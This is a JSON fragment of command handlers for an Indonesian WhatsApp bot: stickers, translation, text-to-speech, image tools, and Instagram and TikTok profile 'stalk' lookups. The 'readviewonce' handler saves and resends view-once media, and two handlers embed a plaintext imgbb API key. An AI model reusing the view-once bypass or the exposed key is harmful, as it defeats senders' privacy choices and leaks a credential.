    "function": "async (m, {conn, command}) => {\nlet {reply} = m\nconst quoted = m.quoted ? m.quoted : m\nconst mime = (quoted.msg || quoted).mimetype || ''\nconst qmsg = (quoted.msg || quoted)\nif (/webp/.test(mime)) {\nlet media = await conn.downloadMediaMessage(qmsg);\nlet stiker = await addExif(media, global.packname, global.author)\nconn.sendMessage(m.chat, {sticker: stiker},{quoted: m})\n}\n}",
    "on": "message",
    "command": "/^toavatar$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "video/image to sticker",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet {reply} = m\nconst quoted = m.quoted ? m.quoted : m\nconst mime = (quoted.msg || quoted).mimetype || ''\nconst qmsg = (quoted.msg || quoted)\nif (/image/.test(mime)) {\nlet media = await conn.downloadMediaMessage(qmsg);\nconn.sendImageAsSticker(m.chat, media, m, {pack: global.packname, author: global.author});\n} else if (/video/.test(mime)) {\nlet media = await conn.downloadMediaMessage(qmsg);\nlet encmedia = await conn.sendVideoAsSticker(m.chat, media, m, {packname: global.packname, author: global.author});\nawait fs.unlinkSync(encmedia);\n} else reply(`Kirim/reply gambar/video/gif dengan caption ${command}\\nDurasi Video/Gif 1-9 Detik`);\n}",
    "on": "message",
    "command": "/^(s|stiker|sticker)$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "sticker with custom watermark",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nconst quoted = m.quoted ? m.quoted : m\nconst mime = (quoted.msg || quoted).mimetype || ''\nconst qmsg = (quoted.msg || quoted)\nconst {q} = m\nif (!q) return reply('input packname|author')\nif (!/webp/.test(mime)) return m.reply(`Reply sticker dengan caption *${prefix + command}*`);\ntry {\nlet { webp2mp4File } = require(\"../lib/uploader\");\nlet medias = await conn.downloadAndSaveMediaMessage(qmsg);\nlet ran = await webp2mp4File(medias);\nconn.sendVideoAsSticker(m.chat, ran.result, m, {\npackname: q.split('|')[0],\nauthor: q.split('|')[1],\n});\n} catch {\nlet media = await conn.downloadAndSaveMediaMessage(qmsg);\nlet ran = await getRandom(\".png\");\nexec(`ffmpeg -i ${media} ${ran}`, (err) => {\nlet buffer = fs.readFileSync(ran);\nconn.sendImageAsSticker(m.chat, buffer, m, {\npackname: q.split('|')[0],\nauthor: q.split('|')[1],\n});\n});\n}\n}",
    "on": "message",
    "command": "/^(swm|wm)$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "text To Picture",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nconst {q} = m\nif (!q) return m.reply('text?')\nconn.sendImageAsSticker(m.chat, `https://aemt.me/ttp?text=${q}`, m, { packname: global.packname, author: global.author })\n}",
    "on": "message",
    "command": "/ttp/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "Upscale image",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command, reply, qmsg, mime}) => {\nawait reply(global.mess.wait);\nlet media = await conn.downloadAndSaveMediaMessage(qmsg, \"temp_\" + m.sender);\nconst options = {\napiKey: 'a54fab7dfacaec0565cdfd619ce5dca5', \nimagePath: media,\nexpiration: 600,\n};\nlet {url} = await imgbbUploader(options)\n//console.log(url)\nawait conn.sendMessage(m.chat, { \nimage: {\nurl:`https://apidl.asepharyana.cloud/api/ai/upscaler?url=${url}`}, caption: global.mess.success }, { quoted: m });\n}",
    "on": "message",
    "command": "/^hd$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nif (!m.q) return m.reply(\"teksnya? \") \nm.reply(`${ftxt(m.q)}\\n${ttle(m.q)}`) \n}",
    "on": "message",
    "command": "/^formatteks$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "Stalking Instagram Account",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet { reply, q } = m;\nif (!q) return reply(`usernamenya mana njir, contoh nih: .${command} kurniawan_satria__`);\n\ntry {\nlet ress = await fetchJson(`https://aemt.me/download/igstalk?username=${q}`)\nlet res = ress.result\nconn.sendMessage(m.chat, {\nimage: await getBuffer(res.photoUrl),\ncaption: `*\\`IG STALK\\`*\n_Username:_ ${res.username}\n_FullName:_ ${res.fullName}\n_Bio:_ ${res.bio}\n_Followers:_ ${res.followers}\n_Following:_ ${res.following}\n_PostCount:_ ${res.postsCount}\n`\n}, { quoted: m });\n} catch (error) {\nreply(`Terjadi kesalahan saat mengakses data: ${error.message}`);\n}\n}",
    "on": "message",
    "command": "/^igstalk|stalkig$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "cek orang yang ga follback akun kamu",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, { conn, command, text, reply }) => {\n    try {\n        await reply('Sedang memeriksa... Mohon tunggu sebentar.');\n        await loginInstagram();\n        const { followers, following } = await getFollowersAndFollowing(text);\n        const nonFollowers = await findNonFollowers(followers, following);\n        \n        const responseMessage = nonFollowers.length\n            ? `Akun Yang Anda Follow Tetapi Tidak Memfollow Anda:\\n${nonFollowers.map(username => `https://instagram.com/${username}`).join('\\n')}`\n            : 'Semua akun sudah follback!';\n        \n        await conn.sendButtons(m.chat, '', responseMessage, 'NOTE: silahkan cek dulu, karena terkadang bot suka salah', [{type:'btn',text:\"Ok\",id:'o'}],m);\n    } catch (error) {\n        await reply(\"Terjadi kesalahan: \" + error.message);\n    }\n}",
    "on": "message",
    "command": "/^unfollowers$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "to get Quoted of quoted message",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command, store}) => {\nif (!m.quoted) return m.reply(\"Reply to the message!!\");\nlet wokwol = smsg(conn, await m.getQuotedObj(), store);\nif (!wokwol.quoted) return m.reply(\"The replied message does not contain a quote\");\nawait wokwol.quoted.copyNForward(m.chat, true);\n}",
    "on": "message",
    "command": "/^(quoted|q)$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "membuat pesan readmore",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet { reply, q } = m\nif (!q) return reply(\"where's the text?, use example: .readmore kon|trak\")\nconst more = String.fromCharCode(8206)\nconst readMore = more.repeat(4001)\nreply(q.split(\"|\")[0] + readMore + q.split(\"|\")[1])\n}",
    "on": "message",
    "command": "/^readmore$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "melihat pesan 1 kali lihat",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {command, conn}) => {\nif (m.quoted.mtype !== 'viewOnceMessageV2' && m.quoted.mtype !== 'viewOnceMessageV2Extension') {\nreturn m.reply('Itu bukan pesan viewOnce');\n}\n\nconst view = m.quoted.message;\nconst Type = Object.keys(view)[0];\n\ntry {\nlet mediaType = '';\nif (Type === 'imageMessage') mediaType = 'image';\nelse if (Type === 'videoMessage') mediaType = 'video';\nelse if (Type === 'audioMessage') mediaType = 'audio';\n\nconst media = await downloadContentFromMessage(view[Type], mediaType);\n\nlet buffer = Buffer.from([]);\nfor await (const chunk of media) {\nbuffer = Buffer.concat([buffer, chunk]);\n}\n\nif (/video/.test(Type)) {\nawait conn.sendMessage(m.chat, { video: buffer, caption: view[Type].caption || '' }, { quoted: m });\n} else if (/image/.test(Type)) {\nawait conn.sendMessage(m.chat, { image: buffer, caption: view[Type].caption || '' }, { quoted: m });\n} else if (/audio/.test(Type)) {\nawait conn.sendMessage(m.chat, { audio: buffer, mimetype: 'audio/mpeg' }, { quoted: m });\n}\n} catch (err) {\nconsole.error(err);\nm.reply('Terjadi kesalahan saat mencoba membaca pesan view once.');\n}\n}",
    "on": "message",
    "command": "/^(readviewonce|rvo)$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "Remove Background",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, { conn, command, reply, qmsg, mime }) => {\nawait reply(global.mess.wait);\nlet imgbbUploader = require(\"imgbb-uploader\") \nlet media = await conn.downloadAndSaveMediaMessage(qmsg, \"temp_\" + m.sender);\nconst options = {\napiKey: 'a54fab7dfacaec0565cdfd619ce5dca5', \nimagePath: media,\nexpiration: 600,\n};\nlet {url} = await imgbbUploader(options)\nawait conn.sendMessage(m.chat, { image: {url:`https://api.ryzendesu.vip/api/ai/removebg?url=${url}`}, caption: global.mess.success }, { quoted: m });\n}",
    "on": "message",
    "command": "/^removebg$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "to screenshot a website",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet {reply,q} = m\nlet {ssweb} = require(\"../lib/scrapes\")\nreply(global.mess.wait)\nlet res = await ssweb(q)\nconn.sendMessage(m.chat, {image: res.result, caption: 'nih'},{quoted:m})\n}",
    "on": "message",
    "command": "/ssweb/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "mempercantik teks",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet {q} = m\nif (!q) return m.reply('where\\'s the text?')\nlet ontol = await styletext(q)\nconn.sendButtons(m.chat, '', 'RESULT', global.author, ontol, m)\n}",
    "on": "message",
    "command": "/styletext/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "translate",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet {reply,q} = m\nif (!m.quoted) return reply('usage example: .tr id')\nif (!m.quoted.text) return reply('pesan yang kamu balas tidak mengandung teks.')\nlet data = await langList()\nlet langString = Object.entries(data).map(([code, name]) => `*${name}*: ${code}`).join('\\n');\nif (!q) return reply('usage example: .tr indonesia\\n`list kode bahasa:`\\n' + langString);\nlet ts = await translate(m.quoted.text, q)\nreply(ts[0])\n}",
    "on": "message",
    "command": "/^(tr|translate)$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "text menjadi audio",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, { conn, command, text }) => {\n    if (!text) return m.reply('where\\'s the text?');\n\n    let res = await fetchJson(`https://aemt.uk.to/tts/tiktok?model=indonesian&voice=female1&text=${text}`);\n    \n    conn.sendMessage(m.chat, {\n        audio: { url: res.result.audio },\n        ptt: true,\n        mimetype: 'audio/mpeg',\n        wavefrom: new Uint8Array(64)\n    }, { quoted: m });\n}",
    "on": "message",
    "command": "/^tts$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "Stalking TikTok Account",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet { reply, q } = m;\nif (!q) return reply(`usernamenya mana njir, contoh nih: .${command} kurniawan_satria__`);\n\ntry {\nlet ress = await fetchJson(`https://aemt.me/download/tiktokstalk?username=${q}`)\nlet res = ress.result\nconn.sendMessage(m.chat, {\nimage: await getBuffer(res.profile),\ncaption: `*\\`TIKTOK - STALK\\`*\n_Username:_ ${res.username}\n_Bio:_ ${res.description}\n_Likes:_ ${formatNumber(res.likes)}\n_Followers:_ ${formatNumber(res.followers)}\n_Following:_ ${formatNumber(res.following)}\n_PostCount:_ ${formatNumber(res.postsCount)}\n`\n}, { quoted: m });\n} catch (error) {\nreply(`Terjadi kesalahan saat mengakses data: ${error.message}`);\n}\n}",
    "on": "message",
    "command": "/^ttstalk|stalktt$/",
    "fromMe": false,
    "name": "Unnamed Command"
  }
]